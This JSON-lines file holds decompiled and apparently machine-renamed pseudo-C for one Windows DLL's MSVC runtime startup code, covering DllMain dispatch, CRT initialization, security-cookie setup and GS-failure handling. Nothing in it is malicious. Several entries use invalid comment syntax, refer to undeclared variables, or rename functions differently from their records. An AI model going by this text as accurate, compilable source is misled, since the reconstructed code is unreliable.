{"Function Name": "FUN_10013bb0", "Address": "10013bb0", "Source Code": "int FUN_10013bb0(int input_value_1, int input_value_2, undefined4 unused_param_3, undefined4 *output_pointer)\n{\n    int result; \n    void *original_exception_list; \n    original_exception_list = current_exception_list; \n    current_exception_list = &original_exception_list; \n    result = FUN_100138e0(input_value_1, input_value_2); \n    FUN_1000c630((void *)(result + 8), (undefined8 *)*output_pointer); \n    *(undefined8 *)(result + 0x20) = 0; \n    current_exception_list = original_exception_list; \n    return result; \n}"}
{"Function Name": "FUN_10013cf9", "Address": "10013cf9", "Source Code": "void __cdecl FUN_10013cf9(size_t size_param) \n{\n    int result; \n    do {\n        result = check_function(size_param); \n        if (result != 0) { \n            return; \n        }\n        result = allocate_memory(size_param); \n    } while (result != 0); \n    if (size_param != 0xffffffff) { \n        cleanup_function(); \n        return; \n    }\n    error_handler(NULL); \n    throw_exception(NULL, &exception_data); \n    ((code *)software_interrupt(3))(); \n}"}
{"Function Name": "__crt_fast_encode_pointer<>", "Address": "10013d5f", "Source Code": "\\*\nuint __cdecl __crt_fast_encode_pointer<>(uint param_1)\n{\n    \n    \n    \n    \n    return (input_value >> (0x20 - ((byte)shift_value & 0x1f) & 0x1f) \n            | input_value << ((byte)shift_value & 0x1f)) \n            \n            ^ shift_value;\n}\n*\\ \n \nuint __cdecl __crt_fast_encode_pointer<>(uint param_1)\n{\n    return (input_value >> (0x20 - ((byte)shift_value & 0x1f) & 0x1f) | input_value << ((byte)shift_value & 0x1f)) ^ shift_value;\n}"}
{"Function Name": "find_pe_section", "Address": "10013d7c", "Source Code": "\\*\n_IMAGE_SECTION_HEADER * __cdecl find_pe_section(uchar *image_data, uint address)\n{\n    \n    int pe_header_offset = *(int *)(image_data + 0x3c);\n    \n    \n    _IMAGE_SECTION_HEADER *section_header_start = (_IMAGE_SECTION_HEADER *)\n        (image_data + (uint)*(ushort *)(image_data + pe_header_offset + 0x14) + pe_header_offset + 0x18);\n    \n    \n    _IMAGE_SECTION_HEADER *section_header_end = section_header_start + *(ushort *)(image_data + pe_header_offset + 6);\n    \n    while (section_header_start != section_header_end) {\n        \n        if ((section_header_start->VirtualAddress <= address) &&\n            (address < (section_header_start->Misc).PhysicalAddress + section_header_start->VirtualAddress)) {\n            \n            return section_header_start;\n        }\n        \n        section_header_start++;\n    }\n    \n    \n    return (_IMAGE_SECTION_HEADER *)0x0;\n}\n*\\ \n \n_IMAGE_SECTION_HEADER * __cdecl find_pe_section(uchar *image_data, uint address)\n{\n    int pe_header_offset = *(int *)(image_data + 0x3c);\n    _IMAGE_SECTION_HEADER *section_header_start = (_IMAGE_SECTION_HEADER *)\n        (image_data + (uint)*(ushort *)(image_data + pe_header_offset + 0x14) + pe_header_offset + 0x18);\n    _IMAGE_SECTION_HEADER *section_header_end = section_header_start + *(ushort *)(image_data + pe_header_offset + 6);\n    while (section_header_start != section_header_end) {\n        if ((section_header_start->VirtualAddress <= address) &&\n            (address < (section_header_start->Misc).PhysicalAddress + section_header_start->VirtualAddress)) {\n            return section_header_start;\n        }\n        section_header_start++;\n    }\n    return (_IMAGE_SECTION_HEADER *)0x0;\n}"}
{"Function Name": "___scrt_acquire_startup_lock", "Address": "10013dc0", "Source Code": "uint ___scrt_acquire_startup_lock(void)\n{\n    uint memoryValue; \n    uint tempValue; \n    \n    if (___scrt_is_ucrt_dll_in_use()) {\n        while (true) { \n            tempValue = 0; \n            LOCK(); \n            memoryValue = *(uint *)((int)context + 4); \n            if (sharedData != 0) { \n                tempValue = sharedData; \n                memoryValue = sharedData; \n            }\n            sharedData = memoryValue; \n            UNLOCK(); \n            if (tempValue == 0) break; \n            if (*(uint *)((int)context + 4) == tempValue) { \n                return CONCAT31((int3)(tempValue >> 8), 1); \n            }\n        }\n    }\n    return tempValue & 0xffffff00; \n}"}
{"Function Name": "___scrt_dllmain_after_initialize_c", "Address": "10013df2", "Source Code": "undefined4 ___scrt_dllmain_after_initialize_c(void)\n{\n    int returnValue; \n    uint unsignedReturnValue; \n    \n    if (___scrt_is_ucrt_dll_in_use() == 0) {\n        \n        returnValue = FUN_10014a3d();\n        \n        unsignedReturnValue = FUN_10025d64(returnValue);\n        \n        if (unsignedReturnValue != 0) {\n            return unsignedReturnValue & 0xffffff00;\n        }\n        \n        returnValue = common_initialize_environment_nolock<char>();\n    } else {\n        \n        returnValue = ___isa_available_init();\n    }\n    \n    return CONCAT31((int3)((uint)returnValue >> 8), 1);\n}"}
{"Function Name": "___scrt_dllmain_before_initialize_c", "Address": "10013e1d", "Source Code": "bool dllmain_before_initialize_c(void)\n{\n    \n    \n    \n    return (char)initialize_onexit_tables(0) != '\\0';\n}"}
{"Function Name": "___scrt_dllmain_crt_thread_attach", "Address": "10013e2b", "Source Code": "undefined threadAttachHandler(void)\n{\n    \n    if (isThreadAttached() && isAnotherConditionMet()) {\n        return 1; \n    }\n    \n    detachThread();\n    return 0; \n}"}
{"Function Name": "___scrt_dllmain_exception_filter", "Address": "10013e57", "Source Code": "void __cdecl\n___scrt_dllmain_exception_filter\n(undefined4 param_1, int param_2, undefined4 param_3, undefined *param_4, int param_5,\nuint *param_6)\n{\n    \n    if (!___scrt_is_ucrt_dll_in_use() && param_2 == 1) {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(param_1, 0, param_3);\n        \n        (*(code *)param_4)();\n    }\n    \n    __seh_filter_dll(param_5, param_6);\n}"}
{"Function Name": "FUN_10013e8b", "Address": "10013e8b", "Source Code": "void FUN_10013e8b(void)\n{\n    \n    if (isUCRTInUse()) {\n        \n        executeOnExitTable(0x14);\n        return; \n    }\n    \n    \n    if (checkFunctionReturn() != 0) {\n        return; \n    }\n    \n    \n    callFunctionWithParams(0, 0, 1);\n}"}
{"Function Name": "___scrt_initialize_crt", "Address": "10013ebb", "Source Code": "uint __cdecl ___scrt_initialize_crt(int input_param)\n{\n    \n    if (input_param == 0) {\n        \n        global_init_flag = 1;\n    }\n    \n    \n    ___isa_available_init();\n    \n    \n    uint vcrt_init_result = ___vcrt_initialize();\n    \n    \n    if (vcrt_init_result != 0) {\n        \n        if (___acrt_initialize() != 0) {\n            \n            return 1;\n        }\n        \n        vcrt_init_result = ___vcrt_uninitialize('\\0');\n    }\n    \n    \n    return vcrt_init_result & 0xffffff00;\n}"}
{"Function Name": "___scrt_initialize_onexit_tables", "Address": "10013ef4", "Source Code": "undefined4 __cdecl ___scrt_initialize_onexit_tables(int init_param)\n{\n    code *func_ptr; \n    byte temp_byte; \n    bool is_ucrt_in_use; \n    uint result_mask; \n    \n    if (is_initialized != '\\0') {\n        return 1; \n    }\n    \n    \n    if ((init_param != 0) && (init_param != 1)) {\n        ___scrt_fastfail(5); \n        func_ptr = (code *)swi(3); \n        return (*func_ptr)(); \n    }\n    \n    \n    is_ucrt_in_use = ___scrt_is_ucrt_dll_in_use();\n    \n    \n    if ((is_ucrt_in_use == 0) || (init_param != 0)) {\n        \n        temp_byte = 0x20 - ((byte)bitmask_source & 0x1f) & 0x1f; \n        result_mask = (0xffffffffU >> temp_byte | -1 << 0x20 - temp_byte) ^ bitmask_source; \n        \n        on_exit_table_1 = result_mask;\n        DAT_1004f618 = result_mask;\n        DAT_1004f61c = result_mask;\n        on_exit_table_2 = result_mask;\n        DAT_1004f624 = result_mask;\n        DAT_1004f628 = result_mask;\n        is_initialized = '\\x01'; \n        return 1; \n    } else {\n        \n        result_mask = __initialize_onexit_table(&on_exit_table_1);\n        if (result_mask == 0) { \n            \n            result_mask = __initialize_onexit_table(&on_exit_table_2);\n            if (result_mask == 0) { \n                is_initialized = '\\x01'; \n                return 1; \n            }\n        }\n        return result_mask & 0xffffff00; \n    }\n}"}
{"Function Name": "___scrt_is_nonwritable_in_current_image", "Address": "10013f99", "Source Code": "uint __cdecl ___scrt_is_nonwritable_in_current_image(int section_index)\n{\n    _IMAGE_SECTION_HEADER *section_header; \n    section_header = (_IMAGE_SECTION_HEADER *)0x5a4d; \n    \n    if ((((dos_header.e_magic == (char [2])0x5a4d) && \n    (section_header = (_IMAGE_SECTION_HEADER *)dos_header.e_lfanew, \n    *(int *)(dos_header.e_lfanew + 0x10000000) == 0x4550)) && \n    (*(short *)((int)dos_header.e_res_4_ + (dos_header.e_lfanew - 4) \n    ) == 0x10b)) &&\n    (section_header = locate_pe_section((uchar *)&dos_header,section_index + 0xf0000000), \n    section_header != (_IMAGE_SECTION_HEADER *)0x0 && (-1 < (int)section_header->Characteristics))) { \n        return CONCAT31((int3)((uint)section_header >> 8),1); \n    }\n    return (uint)section_header & 0xffffff00; \n}"}
{"Function Name": "___scrt_release_startup_lock", "Address": "1001402d", "Source Code": "int __cdecl ___scrt_release_startup_lock(char inputChar)\n{\n    bool isUcrtDllInUse; \n    int previousLockState;  \n    isUcrtDllInUse = ___scrt_is_ucrt_dll_in_use(); \n    previousLockState = lockState; \n    \n    if ((isUcrtDllInUse != 0) && (inputChar == '\\0')) {\n        LOCK(); \n        lockState = 0; \n        UNLOCK(); \n    }\n    \n    return previousLockState; \n}"}
{"Function Name": "___scrt_uninitialize_crt", "Address": "1001404a", "Source Code": "undefined4 __cdecl ___scrt_uninitialize_crt(char input_param, char check_param)\n{\n    \n    if (global_flag == '\\0' || check_param == '\\0') {\n        \n        uninitialize_crt();\n        \n        return combine_values((int3)((uint)vcrt_uninitialize(input_param) >> 8), 1);\n    }\n    \n    return combine_values(0, 1);\n}"}
{"Function Name": "__onexit", "Address": "10014072", "Source Code": "_onexit_t cdecl_calling_convention on_exit_handler(_onexit_t _Func)\n{\n    \n    byte lower_bits = (byte)global_var_1 & 0x1f;\n    \n    \n    if (((global_var_1 ^ global_var_2) >> lower_bits | (global_var_1 ^ global_var_2) << 0x20 - lower_bits) == 0xffffffff) {\n        \n        \n        return (exit_function_type)(~-(uint)(crt_atexit_function(_Func) != 0) & (uint)_Func);\n    } else {\n        \n        \n        return (exit_function_type)(~-(uint)(register_on_exit_function(0x14, (char)_Func) != 0) & (uint)_Func);\n    }\n}"}
{"Function Name": "_atexit", "Address": "100140ad", "Source Code": "int __cdecl _atexit(_func_4879 *exit_function_pointer) \n{\n    \n    return register_exit_handler((_onexit_t)exit_function_pointer) != (_onexit_t)0x0 ? 0 : -1; \n}"}
{"Function Name": "`eh_vector_destructor_iterator'", "Address": "100140c2", "Source Code": "void _eh_vector_destructor_iterator_\n(void *param_1, uint param_2, uint param_3, _func_void_void_ptr *param_4)\n{\n    \n    while (param_3 != 0) {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)();\n        \n        (*param_4)((void *)0x10014101);\n        \n        param_3--;\n    }\n    \n    FUN_10014137();\n    return; \n}"}
{"Function Name": "FUN_10014137", "Address": "10014137", "Source Code": "void FUN_10014137(void)\n{\n    char inputChar; \n    \n    if (inputChar == '\\0') {\n        \n        arrayUnwind(unaffESI, unaffEBX, unaffEDI, *(_func_void_void_ptr **)(unaffEBP + 0x14));\n    }\n}"}
{"Function Name": "__ArrayUnwind", "Address": "10014147", "Source Code": "void __ArrayUnwind(void *input_param, uint count_1, uint count_2, _func_void_void_ptr *function_ptr)\n{\n    uint iterator; \n    void *address_pointer = (void *)0x10014172; \n    \n    for (iterator = 0; iterator != count_2; iterator++) {\n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        (*function_ptr)(address_pointer); \n    }\n    return; \n}"}
{"Function Name": "___raise_securityfailure", "Address": "100141c9", "Source Code": "void __cdecl ___raise_securityfailure(_EXCEPTION_POINTERS *exceptionPointers)\n{\n    \n    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);\n    \n    \n    UnhandledExceptionFilter(exceptionPointers);\n    \n    \n    TerminateProcess(GetCurrentProcess(), 0xc0000409);\n}"}
{"Function Name": "___report_gsfailure", "Address": "100141f1", "Source Code": "void __cdecl ___report_gsfailure(void)\n{\n    code *functionPointer; \n    uint processorFeaturePresence;   \n    undefined4 undefinedVar; \n    undefined8 combinedValue; \n    processorFeaturePresence = IsProcessorFeaturePresent(0x17); \n    combinedValue = CONCAT44(0, processorFeaturePresence); \n    \n    if (processorFeaturePresence != 0) { \n        functionPointer = (code *)swi(0x29); \n        combinedValue = (*functionPointer)(); \n    }\n    \n    highBits = (undefined4)((ulonglong)combinedValue >> 0x20); \n    lowBits = (undefined4)combinedValue; \n    processorFlags = (uint)(in_NT & 1) * 0x4000 | \n                    (uint)(in_IF & 1) * 0x200 |\n                    (uint)(in_TF & 1) * 0x100 |\n                    (uint)((int)processorFeaturePresence < 0 & 1) * 0x80 |\n                    (uint)(processorFeaturePresence == 0 & 1) * 0x40 |\n                    (uint)(in_AF & 1) * 0x10 |\n                    (uint)((POPCOUNT(processorFeaturePresence & 0xff) & 1U) == 0 & 1) * 4 |\n                    (uint)(in_ID & 1) * 0x200000 |\n                    (uint)(in_VIP & 1) * 0x100000 |\n                    (uint)(in_VIF & 1) * 0x80000 |\n                    (uint)(in_AC & 1) * 0x40000;\n    stackPointer = &stack0x00000004; \n    errorCode1 = 0x10001; \n    errorCode2 = 0xc0000409; \n    flag1 = 1; \n    flag2 = 1; \n    flag3 = 2; \n    returnAddress = unaff_retaddr; \n    gsSegment = in_GS; \n    fsSegment = in_FS; \n    esSegment = in_ES; \n    dsSegment = in_DS; \n    ediRegister = unaff_EDI; \n    esiRegister = unaff_ESI; \n    ebxRegister = unaff_EBX; \n    undefinedVar2 = undefinedVar; \n    ebpRegister = unaff_EBP; \n    returnAddress2 = unaff_retaddr; \n    csSegment = in_CS; \n    ssSegment = in_SS; \n    ___raise_securityfailure((_EXCEPTION_POINTERS *)&PTR_DAT_1003a3cc); \n    return; \n}"}
{"Function Name": "___report_rangecheckfailure", "Address": "100142ea", "Source Code": "void reportRangeCheckFailure(void) \n{\n    reportSecurityFailure(8); \n}"}
{"Function Name": "___report_securityfailure", "Address": "100142f6", "Source Code": "void __cdecl ___report_securityfailure(undefined4 security_param)\n{\n    code *function_pointer; \n    uint processor_feature_present; \n    undefined4 unused_variable; \n    undefined8 function_result; \n    processor_feature_present = IsProcessorFeaturePresent(0x17); \n    function_result = CONCAT44(0, processor_feature_present); \n    if (processor_feature_present != 0) { \n        function_pointer = (code *)swi(0x29); \n        function_result = (*function_pointer)(); \n    }\n    high_bits_result = (undefined4)((ulonglong)function_result >> 0x20); \n    low_bits_result = (undefined4)function_result; \n    combined_flags = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | \n                    (uint)(in_TF & 1) * 0x100 | \n                    (uint)((int)processor_feature_present < 0 & 1) * 0x80 | \n                    (uint)(processor_feature_present == 0 & 1) * 0x40 | \n                    (uint)(in_AF & 1) * 0x10 | \n                    (uint)((POPCOUNT(processor_feature_present & 0xff) & 1U) == 0 & 1) * 4 | \n                    (uint)(in_ID & 1) * 0x200000 | \n                    (uint)(in_VIP & 1) * 0x100000 | \n                    (uint)(in_VIF & 1) * 0x80000 | \n                    (uint)(in_AC & 1) * 0x40000; \n    param_1_address = &security_param; \n    error_code = 0xc0000409; \n    security_failure_flag = 1; \n    another_security_flag = 1; \n    parameter_value = security_param; \n    return_address = unaff_retaddr; \n    gs_register_value = in_GS; \n    fs_register_value = in_FS; \n    es_register_value = in_ES; \n    ds_register_value = in_DS; \n    edi_register_value = unaff_EDI; \n    esi_register_value = unaff_ESI; \n    ebx_register_value = unaff_EBX; \n    unused_variable_storage = unused_variable; \n    ebp_register_value = unaff_EBP; \n    return_address_duplicate = unaff_retaddr; \n    cs_register_value = in_CS; \n    ss_register_value = in_SS; \n    ___raise_securityfailure((_EXCEPTION_POINTERS *)&PTR_DAT_1003a3cc); \n    return; \n}"}
{"Function Name": "FUN_100143c4", "Address": "100143c4", "Source Code": "void FUN_100143c4(size_t input_size)\n{\n    \n    undefined *label_pointer = &LAB_10038eab;\n    \n    exception_list = &exception_list;\n    \n    FUN_10013cf9(input_size);\n    \n    FUN_10014404();\n    \n    return;\n}"}
{"Function Name": "FUN_10014404", "Address": "10014404", "Source Code": "void FUN_10014404(void) \n{\n    exception_list = *(void **)(*(int *)0xFFFFFFF4); \n}"}
{"Function Name": "`eh_vector_constructor_iterator'", "Address": "10014422", "Source Code": "void _eh_vector_constructor_iterator_\n(void *param_1,uint param_2,uint param_3,_func_void_void_ptr *param_4)\n{\n    uint uVar1; \n    void *pvVar2 = (void *)0x10014447; \n    \n    for (uVar1 = 0; uVar1 != param_3; uVar1++) {\n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        (*param_4)(pvVar2); \n    }\n    \n    FUN_10014482(); \n    return; \n}"}
{"Function Name": "FUN_10014482", "Address": "10014482", "Source Code": "void FUN_10014482(void)\n{\n    char inputCharacter; \n    if (inputCharacter == '\\0') { \n        \n        \n        \n        \n        \n        __ArrayUnwind(*(void **)(basePointer + 8), *(uint *)(basePointer + 0xc), unaffEBX,\n        *(_func_void_void_ptr **)(basePointer + 0x18));\n    }\n}"}
{"Function Name": "dllmain_crt_dispatch", "Address": "10014496", "Source Code": "int dllmain_crt_dispatch(HINSTANCE__ *hInstance, ulong operationType, void *context)\n{\n    \n    if (operationType == 0) {\n        \n        return dllmain_crt_process_detach(context != NULL) & 0xff;\n    } \n    \n    else if (operationType == 1) {\n        \n        return dllmain_crt_process_attach(hInstance, context) & 0xff;\n    } \n    \n    else if (operationType == 2) {\n        \n        return ___scrt_dllmain_crt_thread_attach() & 0xff;\n    } \n    \n    else if (operationType == 3) {\n        \n        return ___scrt_dllmain_crt_thread_detach() & 0xff;\n    }\n    \n    return 1;\n}"}
{"Function Name": "dllmain_crt_process_attach", "Address": "100144e9", "Source Code": "int __cdecl dllmain_crt_process_attach(HINSTANCE__ *hInstance, void *lpReserved)\n{\n    code *functionPtr; \n    bool isInitialized; \n    int initResult; \n    code **functionPtrPtr; \n    \n    if ((char)___scrt_initialize_crt(0) != '\\0') {\n        ___scrt_acquire_startup_lock(); \n        isInitialized = true; \n        \n        if (DAT_1004f608 != 0) {\n            ___scrt_fastfail(7); \n            functionPtr = (code *)swi(3); \n            return (*functionPtr)(); \n        }\n        DAT_1004f608 = 1; \n        \n        if (___scrt_dllmain_before_initialize_c()) {\n            __RTC_Initialize(); \n            FUN_10014c64(); \n            ___scrt_initialize_default_local_stdio_options(); \n            \n            initResult = __initterm_e((undefined **)&DAT_1003a33c, (undefined **)&DAT_1003a354);\n            \n            if (initResult == 0 && (char)___scrt_dllmain_after_initialize_c() != '\\0') {\n                \n                __initterm((undefined **)&DAT_1003a2fc, (undefined **)&DAT_1003a338);\n                DAT_1004f608 = 2; \n                isInitialized = false; \n            }\n        }\n        FUN_100145e1(); \n        \n        if (!isInitialized) {\n            functionPtrPtr = (code **)FUN_10014c99(); \n            \n            if ((*functionPtrPtr != (code *)0x0) && (char)___scrt_is_nonwritable_in_current_image((int)functionPtrPtr) != '\\0') {\n                functionPtr = *functionPtrPtr; \n                \n                (*(code *)PTR__guard_check_icall_1003a2f8)(hInstance, 2, lpReserved);\n                (*functionPtr)(); \n            }\n            DAT_1004f94c++; \n            return 1; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "dllmain_dispatch", "Address": "10014685", "Source Code": "int __cdecl dllmain_dispatch(HINSTANCE__ *hInstance, ulong callType, void *lpReserved)\n{\n    int result;\n    \n    if ((callType == 0) && (DAT_1004f94c < 1)) {\n        result = 0; \n    } else if (((callType != 1) && (callType != 2)) || \n               ((result = dllmain_raw(hInstance, callType, lpReserved), result != 0 && \n                (result = dllmain_crt_dispatch(hInstance, callType, lpReserved), result != 0)))) { \n        result = FUN_10013150(hInstance, callType); \n        if ((callType == 1) && (result == 0)) { \n            FUN_10013150(hInstance, 0); \n            dllmain_crt_dispatch(hInstance, 0, lpReserved); \n            dllmain_raw(hInstance, 0, lpReserved); \n        }\n        \n        if (((callType == 0) || (callType == 3)) && \n            (result = dllmain_crt_dispatch(hInstance, callType, lpReserved), result != 0)) { \n            result = dllmain_raw(hInstance, callType, lpReserved); \n        }\n    }\n    return result; \n}"}
{"Function Name": "dllmain_raw", "Address": "1001478b", "Source Code": "int dllmain_raw(HINSTANCE__ *instance, ulong flag, void *data)\n{\n    \n    if (function_pointer == (code *)0x0) {\n        \n        return 1;\n    } else {\n        \n        (*(code *)guard_check_function)(instance, flag, data);\n        \n        return (*function_pointer)();\n    }\n}"}
{"Function Name": "entry", "Address": "100147b6", "Source Code": "void entry(HINSTANCE__ *hInstance, ulong flag, void *data)\n{\n    \n    if (flag == 1) {\n        \n        ___security_init_cookie();\n    }\n    \n    dllmain_dispatch(hInstance, flag, data);\n}"}
{"Function Name": "FUN_100147d9", "Address": "100147d9", "Source Code": "\\*\nreturnType * methodCall FUN_100147d9(void *currentObject, int argument1)\n{\n    \n    externalFunction(currentObject, argument1);\n    \n    \n    *(undefined ***)currentObject = std::bad_alloc::vftable;\n    \n    \n    return (undefined4 *)currentObject;\n}\n*\\ \n \nreturnType * methodCall FUN_100147d9(void *currentObject,int argument1)\n{\n    externalFunction(currentObject,argument1);\n    *(undefined ***)currentObject = std::bad_alloc::vftable;\n    return (undefined4 *)currentObject;\n}"}
{"Function Name": "FUN_1001480c", "Address": "1001480c", "Source Code": "\\*\nundefined4 * __thiscall FUN_1001480c(void *object, int argument)\n{\n    \n    FUN_10001630(object, argument);\n    \n    \n    *(undefined ***)object = std::bad_array_new_length::vftable;\n    \n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_1001480c(void *object,int argument)\n{\n    FUN_10001630(object,argument);\n    *(undefined ***)object = std::bad_array_new_length::vftable;\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_1001483f", "Address": "1001483f", "Source Code": "\\*\nundefined4 * methodCall FUN_1001483f(void *currentObject, byte flag)\n{\n    \n    *(undefined ***)currentObject = std::exception::vftable;\n    \n    ___std_exception_destroy((void **)((int)currentObject + 4));\n    \n    if (flag & 1) {\n        FUN_10013ceb(currentObject);\n    }\n    \n    return (undefined4 *)currentObject;\n}\n*\\ \n \nundefined4 * methodCall FUN_1001483f(void *currentObject, byte flag)\n{\n    *(undefined ***)currentObject = std::exception::vftable;\n    ___std_exception_destroy((void **)((int)currentObject + 4));\n    if (flag & 1) {\n        FUN_10013ceb(currentObject);\n    }\n    return (undefined4 *)currentObject;\n}"}
{"Function Name": "___isa_available_init", "Address": "100148a6", "Source Code": "undefined4 ___isa_available_init(void)\n{\n    uint *version_info_ptr; \n    int *basic_info_ptr;  \n    uint current_dat_value;   \n    uint feature_flags;   \n    uint version_info;   \n    BOOL is_feature_present;   \n    uint xcr0_register_value; \n    DAT_1004f950 = 0; \n    DAT_1004e00c |= 1; \n    is_feature_present = IsProcessorFeaturePresent(10); \n    current_dat_value = DAT_1004e00c; \n    if (is_feature_present) { \n        DAT_1004e00c |= 2; \n        DAT_1004f950 = 1; \n        basic_info_ptr = (int *)cpuid_basic_info(0); \n        version_info_ptr = (uint *)cpuid_Version_info(1); \n        version_info = version_info_ptr[3]; \n        \n        if (((basic_info_ptr[3] ^ 0x6c65746eU | basic_info_ptr[2] ^ 0x49656e69U | basic_info_ptr[1] ^ 0x756e6547U) == 0) &&\n            ((feature_flags = *version_info_ptr & 0xfff3ff0, feature_flags == 0x106c0 || feature_flags == 0x20660 || feature_flags == 0x20670 ||\n            feature_flags == 0x30650 || feature_flags == 0x30660 || feature_flags == 0x30670))) {\n            DAT_1004f954 |= 1; \n        }\n        if (*basic_info_ptr < 7) { \n            feature_flags = 0; \n        } else {\n            feature_flags = *(uint *)(cpuid_Extended_Feature_Enumeration_info(7) + 4); \n            if (feature_flags & 0x200) { \n                DAT_1004f954 |= 2; \n            }\n        }\n        if (version_info & 0x100000) { \n            DAT_1004e00c = current_dat_value | 6; \n            DAT_1004f950 = 2; \n            if ((version_info & 0x8000000) && (version_info & 0x10000000) && ((xcr0_register_value & 6) == 6)) { \n                DAT_1004e00c = current_dat_value | 0xe; \n                DAT_1004f950 = 3; \n                if (feature_flags & 0x20) { \n                    DAT_1004e00c = current_dat_value | 0x2e; \n                    DAT_1004f950 = 5; \n                }\n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "___scrt_fastfail", "Address": "10014a4d", "Source Code": "void ___scrt_fastfail(undefined4 feature_check_param)\n{\n    code *function_pointer; \n    BOOL is_feature_present; \n    LONG exception_filter_result; \n    undefined4 context_array[39]; \n    EXCEPTION_RECORD exception_record; \n    _EXCEPTION_POINTERS exception_pointers; \n    \n    is_feature_present = IsProcessorFeaturePresent(0x17);\n    if (is_feature_present != 0) { \n        function_pointer = (code *)swi(0x29); \n        (*function_pointer)(); \n    }\n    \n    FUN_10014b67(); \n    \n    \n    _memset(context_array, 0, 0x2cc);\n    context_array[0] = 0x10001; \n    \n    _memset(&exception_record, 0, sizeof(exception_record));\n    exception_record.ExceptionCode = 0x40000015; \n    exception_record.ExceptionFlags = 1; \n    \n    exception_pointers.ExceptionRecord = &exception_record; \n    exception_pointers.ContextRecord = (PCONTEXT)context_array; \n    \n    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);\n    \n    \n    exception_filter_result = UnhandledExceptionFilter(&exception_pointers);\n    \n    \n    if ((exception_filter_result == 0) && (is_feature_present != 1)) {\n        FUN_10014b67(); \n    }\n    \n    return; \n}"}
{"Function Name": "__SEH_prolog4", "Address": "10014b70", "Source Code": "void __cdecl __SEH_prolog4(undefined4 input_param_1, int input_param_2)\n{\n    int negated_param_2; \n    uint context_stack[5]; \n    \n    negated_param_2 = -input_param_2; \n    *(undefined4 *)((int)context_stack + negated_param_2 + 0x10) = saved_EBX; \n    *(undefined4 *)((int)context_stack + negated_param_2 + 0xc) = saved_ESI; \n    *(undefined4 *)((int)context_stack + negated_param_2 + 8) = saved_EDI; \n    *(uint *)((int)context_stack + negated_param_2 + 4) = modified_param_2 ^ (uint)&input_param_2; \n    *(undefined4 *)((int)context_stack + negated_param_2) = saved_return_address; \n    exception_list = (undefined *)0; \n    return; \n}"}
{"Function Name": "__SEH_epilog4", "Address": "10014bb6", "Source Code": "void __SEH_epilog4(void) \n{\n    undefined4 *currentFramePointer = (undefined4 *)__builtin_frame_address(0); \n    *currentFramePointer = currentFramePointer[-1]; \n}"}
{"Function Name": "___get_entropy", "Address": "10014bcc", "Source Code": "uint ___get_entropy(void) \n{\n    LARGE_INTEGER performance_counter; \n    FILETIME system_time; \n    uint intermediate_entropy; \n    GetSystemTimeAsFileTime(&system_time); \n    intermediate_entropy = system_time.dwHighDateTime ^ system_time.dwLowDateTime; \n    intermediate_entropy ^= GetCurrentThreadId(); \n    intermediate_entropy ^= GetCurrentProcessId(); \n    QueryPerformanceCounter(&performance_counter); \n    return performance_counter.s.HighPart ^ performance_counter.s.LowPart ^ intermediate_entropy ^ (uint)&intermediate_entropy; \n}"}
{"Function Name": "___security_init_cookie", "Address": "10014c19", "Source Code": "void __cdecl ___security_init_cookie(void)\n{\n    \n    if ((entropy_value == 0xbb40e64e) || ((entropy_value & 0xffff0000) == 0)) {\n        \n        entropy_value = ___get_entropy();\n        \n        \n        if (entropy_value == 0xbb40e64e) {\n            entropy_value = 0xbb40e64f;\n        \n        } else if ((entropy_value & 0xffff0000) == 0) {\n            \n            entropy_value |= (entropy_value | 0x4711) << 0x10;\n        }\n    }\n    \n    negated_entropy_value = ~entropy_value;\n}"}
{"Function Name": "___scrt_initialize_default_local_stdio_options", "Address": "10014c7c", "Source Code": "void ___scrt_initialize_default_local_stdio_options(void)\n{\n    uint *optionPointer; \n    optionPointer = (uint *)FUN_10001570(); \n    *optionPointer |= 4; \n    optionPointer = (uint *)FUN_10007b90(); \n    *optionPointer |= 2; \n}"}
{"Function Name": "__RTC_Initialize", "Address": "10014c9f", "Source Code": "void rtc_initialize(void)\n{\n    \n}"}
{"Function Name": "__RTC_Terminate", "Address": "10014ccb", "Source Code": "void terminateRTC(void) {}"}
{"Function Name": "FUN_10014cf7", "Address": "10014cf7", "Source Code": "undefined4 __fastcall FUN_10014cf7(undefined4 input_param)\n{\n    LOCK(); \n    global_counter++; \n    UNLOCK(); \n    if (global_counter == 0) { \n        _Rmtx *mutex_ptr = (_Rmtx *)&mutex_array; \n        do {\n            __Mtxinit(mutex_ptr); \n            mutex_ptr++; \n        } while ((int)mutex_ptr < 0x1004fa30); \n    }\n    return input_param; \n}"}
{"Function Name": "__Deletegloballocale", "Address": "1001511a", "Source Code": "void __cdecl __Deletegloballocale(int **local_var_ptr) \n{\n    if (*local_var_ptr != (int *)0x0) { \n        code *function_ptr = *(code **)(**local_var_ptr + 8); \n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        undefined4 *result_ptr = (undefined4 *)(*function_ptr)(); \n        if (result_ptr != (undefined4 *)0x0) { \n            function_ptr = *(code **)*result_ptr; \n            (*(code *)PTR__guard_check_icall_1003a2f8)(1); \n            (*function_ptr)(); \n        }\n    }\n}"}
